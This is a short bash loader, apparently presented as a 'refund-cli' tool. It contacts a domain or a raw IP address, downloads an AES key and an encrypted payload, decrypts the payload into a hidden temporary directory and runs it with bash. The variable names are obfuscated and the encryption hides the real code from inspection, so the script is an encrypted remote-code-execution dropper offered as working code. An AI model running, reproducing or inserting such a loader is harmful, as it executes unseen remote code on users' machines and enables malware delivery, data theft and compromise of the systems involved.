#!/usr/bin/env bash
set -euo pipefail
_e(){ printf "\033[0;31m[X]\033[0m %s\n" "$*" >&2; }
_H=("https://kc.szbjxbj.com" "http://122.51.98.97")
_B=""
for _h in "${_H[@]}"; do
  _r=$(curl -fsSL --noproxy '*' --connect-timeout 5 --max-time 10 "$_h/pub/refund-cli/stats?fmt=text" 2>/dev/null) || _r=""
  if [ -n "$_r" ]; then _B="$_h"; break; fi
done
[ -z "$_B" ] && { _e "无法连接服务器"; exit 1; }
_d=$(mktemp -d "${TMPDIR:-/tmp}/.kcr_XXXXXXXXXX")
trap "rm -rf \"$_d\"" EXIT INT TERM HUP
_k=$(curl -fsSL --noproxy '*' --connect-timeout 10 --max-time 15 "$_B/pub/refund-cli/dkey" 2>/dev/null) || _k=""
[ -z "$_k" ] && { _e "初始化失败"; exit 1; }
curl -fsSL --noproxy '*' --connect-timeout 15 --max-time 30 "$_B/pub/refund-cli/payload" -o "$_d/p" 2>/dev/null
[ -s "$_d/p" ] || { _e "下载失败"; exit 1; }
openssl enc -aes-256-cbc -d -md md5 -pass "pass:$_k" -in "$_d/p" -out "$_d/r" 2>/dev/null
head -c2 "$_d/r" 2>/dev/null | grep -q '#!' || { _e "验证失败"; exit 1; }
export KC_BASE="$_B"
bash "$_d/r"
